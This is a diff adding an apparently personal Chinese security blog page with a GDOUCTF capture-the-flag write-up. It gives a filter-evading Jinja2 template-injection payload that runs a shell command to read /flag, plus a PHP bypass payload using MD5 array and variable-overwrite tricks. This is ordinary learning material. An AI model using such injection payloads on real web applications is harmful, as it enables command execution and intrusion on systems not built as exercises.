@@ -1,0 +1,527 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha256-HtsXJanqjKTc8vVQjO4YMhiqFoXkfBsjBWcX91T1jr8=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"monkeyx1.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.17.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"show_result":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="WEBez_ze这题考察的是SSTI注入的绕过手法，也是学习到了一些新的SSTI绕过手法 参考链接：SSTI模板注入-中括号、args、下划线、单双引号、os、request、花括号、数字被过滤绕过 最后得到的payload如下： &amp;#123;% set three&#x3D;dict(ccc&#x3D;a)|join|count %&amp;#125;&amp;#123;% set eight&#x3D;dict(cccccccc&#x3D;a)|j">
+<meta property="og:type" content="article">
+<meta property="og:title" content="GDOUCTF WP">
+<meta property="og:url" content="https://monkeyx1.github.io/2023/07/17/GDOUCTF-WP/index.html">
+<meta property="og:site_name" content="monkey111">
+<meta property="og:description" content="WEBez_ze这题考察的是SSTI注入的绕过手法，也是学习到了一些新的SSTI绕过手法 参考链接：SSTI模板注入-中括号、args、下划线、单双引号、os、request、花括号、数字被过滤绕过 最后得到的payload如下： &amp;#123;% set three&#x3D;dict(ccc&#x3D;a)|join|count %&amp;#125;&amp;#123;% set eight&#x3D;dict(cccccccc&#x3D;a)|j">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://monkeyx1.github.io/images/GDOUCTF-WP/image-20240717201415816.png">
+<meta property="og:image" content="https://monkeyx1.github.io/images/GDOUCTF-WP/image-20240717201426992.png">
+<meta property="og:image" content="https://monkeyx1.github.io/images/GDOUCTF-WP/image-20240717201445856.png">
+<meta property="og:image" content="https://monkeyx1.github.io/images/GDOUCTF-WP/image-20240717201455545.png">
+<meta property="og:image" content="https://monkeyx1.github.io/images/GDOUCTF-WP/image-20240717201506193.png">
+<meta property="og:image" content="https://monkeyx1.github.io/images/GDOUCTF-WP/image-20240717201511106.png">
+<meta property="og:image" content="https://monkeyx1.github.io/images/GDOUCTF-WP/image-20240717201516723.png">
+<meta property="og:image" content="https://monkeyx1.github.io/images/GDOUCTF-WP/image-20240717201523947.png">
+<meta property="article:published_time" content="2023-07-17T12:11:40.000Z">
+<meta property="article:modified_time" content="2024-07-27T17:31:00.672Z">
+<meta property="article:author" content="monkey111">
+<meta property="article:tag" content="比赛">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://monkeyx1.github.io/images/GDOUCTF-WP/image-20240717201415816.png">
+
+
+<link rel="canonical" href="https://monkeyx1.github.io/2023/07/17/GDOUCTF-WP/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://monkeyx1.github.io/2023/07/17/GDOUCTF-WP/","path":"2023/07/17/GDOUCTF-WP/","title":"GDOUCTF WP"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>GDOUCTF WP | monkey111</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">monkey111</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">欢迎来到小菜猴子的安全小窝</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB"><span class="nav-number">1.</span> <span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ez-ze"><span class="nav-number">1.1.</span> <span class="nav-text">ez_ze</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#hate-eat-snake"><span class="nav-number">1.2.</span> <span class="nav-text">hate eat snake</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%97%E4%B8%8D%E4%BA%86%E4%B8%80%E7%82%B9"><span class="nav-number">1.3.</span> <span class="nav-text">受不了一点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#EZ-WEB"><span class="nav-number">1.4.</span> <span class="nav-text">EZ WEB</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CRYPTO"><span class="nav-number">2.</span> <span class="nav-text">CRYPTO</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Absolute-Baby-Encrytpion"><span class="nav-number">2.1.</span> <span class="nav-text">Absolute_Baby_Encrytpion</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="monkey111"
+      src="/images/header.jpg">
+  <p class="site-author-name" itemprop="name">monkey111</p>
+  <div class="site-description" itemprop="description">自先沉稳，而后爱人</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">42</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/monkeyx1" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;monkeyx1" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:647498949@qq.com" title="E-Mail → mailto:647498949@qq.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="返回顶部">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://monkeyx1.github.io/2023/07/17/GDOUCTF-WP/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/header.jpg">
+      <meta itemprop="name" content="monkey111">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="monkey111">
+      <meta itemprop="description" content="自先沉稳，而后爱人">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="GDOUCTF WP | monkey111">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          GDOUCTF WP
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2023-07-17 20:11:40" itemprop="dateCreated datePublished" datetime="2023-07-17T20:11:40+08:00">2023-07-17</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2024-07-28 01:31:00" itemprop="dateModified" datetime="2024-07-28T01:31:00+08:00">2024-07-28</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">web安全学习</span></a>
+        </span>
+    </span>
+
+  
+    <span id="/2023/07/17/GDOUCTF-WP/" class="post-meta-item leancloud_visitors" data-flag-title="GDOUCTF WP" title="阅读次数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span class="leancloud-visitors-count"></span>
+    </span>
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>2.1k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>2 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="ez-ze"><a href="#ez-ze" class="headerlink" title="ez_ze"></a>ez_ze</h2><p>这题考察的是SSTI注入的绕过手法，也是学习到了一些新的SSTI绕过手法</p>
+<p>参考链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_52635170/article/details/129856818">SSTI模板注入-<br>中括号、args、下划线、单双引号、os、request、花括号、数字被过滤绕过</a></p>
+<p>最后得到的payload如下：</p>
+<pre><code>&#123;% set three=dict(ccc=a)|join|count %&#125;&#123;% set eight=dict(cccccccc=a)|join|count %&#125;&#123;% set pop=dict(pop=a)|join %&#125;&#123;% set xhx=(lipsum|string|list)|attr(pop)(three*eight) %&#125;&#123;% set globals=(xhx,xhx,dict(globals=a)|join,xhx,xhx)|join %&#125;&#123;% set get=dict(get=a)|join %&#125;&#123;% set shell=dict(o=a,s=b)|join %&#125;&#123;% set aaa=dict(po=a,pen=b)|join %&#125;&#123;% set builtins=(xhx,xhx,dict(builtins=a)|join,xhx,xhx)|join %&#125;&#123;% set read=dict(read=a)|join %&#125;&#123;% print ((lipsum|attr(globals))|attr(get)(shell)|attr(aaa)('cat /flag')|attr(read)()) %&#125;
+</code></pre>
+<p><img src="/images/GDOUCTF-WP/image-20240717201415816.png" alt="image-20240717201415816"></p>
+<h2 id="hate-eat-snake"><a href="#hate-eat-snake" class="headerlink" title="hate eat snake"></a>hate eat snake</h2><p>这题在snack.js中把除以一千直接去掉</p>
+<p><img src="/images/GDOUCTF-WP/image-20240717201426992.png" alt="image-20240717201426992"></p>
+<p>可以成功得到flag</p>
+<h2 id="受不了一点"><a href="#受不了一点" class="headerlink" title="受不了一点"></a>受不了一点</h2><p>给出了源码，绕过即可得到flag</p>
+<pre><code>&lt;?php
+error_reporting(0);
+header(&quot;Content-type:text/html;charset=utf-8&quot;);
+if (isset($_POST[&#39;gdou&#39;]) &amp;&amp; isset($_POST[&#39;ctf&#39;])) &#123;
+    $b = $_POST[&#39;ctf&#39;];
+    $a = $_POST[&#39;gdou&#39;];
+    if ($_POST[&#39;gdou&#39;] != $_POST[&#39;ctf&#39;] &amp;&amp; md5($a) === md5($b)) &#123;
+        if (isset($_COOKIE[&#39;cookie&#39;])) &#123;
+            if ($_COOKIE[&#39;cookie&#39;] == &#39;j0k3r&#39;) &#123;
+                if (isset($_GET[&#39;aaa&#39;]) &amp;&amp; isset($_GET[&#39;bbb&#39;])) &#123;
+                    $aaa = $_GET[&#39;aaa&#39;];
+                    $bbb = $_GET[&#39;bbb&#39;];
+                    if ($aaa == 114514 &amp;&amp; $bbb == 114514 &amp;&amp; $aaa != $bbb) &#123;
+                        $give = &#39;cancanwordflag&#39;;
+                        $get = &#39;hacker!&#39;;
+                        if (!isset($_GET[&#39;flag&#39;]) &amp;&amp; !isset($_POST[&#39;flag&#39;])) &#123;
+                            die($give);
+                        &#125;
+                        if ($_POST[&#39;flag&#39;] === &#39;flag&#39; || $_GET[&#39;flag&#39;] === &#39;flag&#39;) &#123;
+                            die($get);
+                        &#125;
+                        foreach ($_POST as $key =&gt; $value) &#123;
+                            $$key = $value;
+                        &#125;
+                        foreach ($_GET as $key =&gt; $value) &#123;
+                            $$key = $$value;
+                        &#125;
+                        echo $f1ag;
+                    &#125; else &#123;
+                        echo &quot;洗洗睡吧&quot;;
+                    &#125;
+                &#125; else &#123;
+                    echo &quot;行不行啊细狗&quot;;
+                &#125;
+            &#125;
+        &#125; else &#123;
+            echo &#39;菜菜&#39;;
+        &#125;
+    &#125; else &#123;
+        echo &quot;就这?&quot;;
+    &#125;
+&#125; else &#123;
+    echo &quot;别来沾边&quot;;
+&#125; ?&gt; 
+</code></pre>
+<p>payload如下：</p>
+<pre><code>GET:?aaa=114514a&amp;bbb=114514bPOST:gdou[]=1&amp;ctf[]=2&amp;flag[]=flagCookie:cookie=j0k3r
+</code></pre>
+<p><img src="/images/GDOUCTF-WP/image-20240717201445856.png" alt="image-20240717201445856"></p>
+<h2 id="EZ-WEB"><a href="#EZ-WEB" class="headerlink" title="EZ WEB"></a>EZ WEB</h2><p><img src="/images/GDOUCTF-WP/image-20240717201455545.png" alt="image-20240717201455545"></p>
+<p><img src="/images/GDOUCTF-WP/image-20240717201506193.png" alt="image-20240717201506193"></p>
+<p>然后使用PUT方式访问，得到flag</p>
+<p><img src="/images/GDOUCTF-WP/image-20240717201511106.png" alt="image-20240717201511106"></p>
+<h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="Absolute-Baby-Encrytpion"><a href="#Absolute-Baby-Encrytpion" class="headerlink" title="Absolute_Baby_Encrytpion"></a>Absolute_Baby_Encrytpion</h2><p><img src="/images/GDOUCTF-WP/image-20240717201516723.png" alt="image-20240717201516723"></p>
+<p>js简单的替换加密，替换回来就可以了</p>
+<p><img src="/images/GDOUCTF-WP/image-20240717201523947.png" alt="image-20240717201523947"></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>monkey111
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://monkeyx1.github.io/2023/07/17/GDOUCTF-WP/" title="GDOUCTF WP">https://monkeyx1.github.io/2023/07/17/GDOUCTF-WP/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+                    
+                      <a href="/" rel="tag"><i class="fa fa-tag"></i> </a>
+                    
+                      <a href="/" rel="tag"><i class="fa fa-tag"></i> </a>
+                    
+                      <a href="/" rel="tag"><i class="fa fa-tag"></i> </a>
+                    
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2023/06/20/CVE-2016-4437%E5%A4%8D%E7%8E%B0/" rel="prev" title="CVE-2016-4437复现">
+                  <i class="fa fa-chevron-left"></i> CVE-2016-4437复现
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2023/07/20/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%9F%A5%E8%AF%86%E7%82%B9/" rel="next" title="内网渗透知识点">
+                  内网渗透知识点 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2022 – 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">monkey111</span>
+</div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+      <span>站点总字数：</span>
+    <span title="站点总字数">180k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span>站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">2:44</span>
+  </span>
+</div><div>
+  <span id="sitetime"></span>
+  <script language=javascript>
+      function siteTime(){
+          window.setTimeout("siteTime()", 1000);
+          var seconds = 1000;
+          var minutes = seconds * 60;
+          var hours = minutes * 60;
+          var days = hours * 24;
+          var years = days * 365;
+          var today = new Date();
+          var todayYear = today.getFullYear();
+          var todayMonth = today.getMonth()+1;
+          var todayDate = today.getDate();
+          var todayHour = today.getHours();
+          var todayMinute = today.getMinutes();
+          var todaySecond = today.getSeconds();
+          /* 
+          Date.UTC() -- 返回date对象距世界标准时间(UTC)1970年1月1日午夜之间的毫秒数(时间戳)
+          year - 作为date对象的年份，为4位年份值
+          month - 0-11之间的整数，做为date对象的月份
+          day - 1-31之间的整数，做为date对象的天数
+          hours - 0(午夜24点)-23之间的整数，做为date对象的小时数
+          minutes - 0-59之间的整数，做为date对象的分钟数
+          seconds - 0-59之间的整数，做为date对象的秒数
+          microseconds - 0-999之间的整数，做为date对象的毫秒数
+      */
+          var t1 = Date.UTC(2021,12,23,11,40,00); //北京时间2018-2-13 00:00:00
+          var t2 = Date.UTC(todayYear,todayMonth,todayDate,todayHour,todayMinute,todaySecond);
+          var diff = t2-t1;
+      var diffYears = Math.floor(diff/years);
+      var diffDays = Math.floor((diff/days)-diffYears*365);
+      var diffHours = Math.floor((diff-(diffYears*365+diffDays)*days)/hours);
+      var diffMinutes = Math.floor((diff-(diffYears*365+diffDays)*days-diffHours*hours)/minutes);
+      var diffSeconds = Math.floor((diff-(diffYears*365+diffDays)*days-diffHours*hours-diffMinutes*minutes)/seconds);
+      document.getElementById("sitetime").innerHTML=" 已运行"+/*diffYears+" 年 "+*/diffDays+" 天 "+diffHours+" 小时 "+diffMinutes+" 分钟 "+diffSeconds+" 秒";
+    }
+      siteTime();
+  </script>
+</div>
+
+    </div>
+  </footer>
+
+  
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+
+
+  
+
+  <script class="next-config" data-name="leancloud_visitors" type="application/json">{"enable":true,"app_id":"ccA2VsTMA0zc7SQqWsCEBhP6-gzGzoHsz","app_key":"RzrgPNrOtq5LckltkJZDwE0z","server_url":null,"security":true}</script>
+  <script src="/js/third-party/statistics/lean-analytics.js"></script>
+
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/miku.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false});</script></body>
+</html>
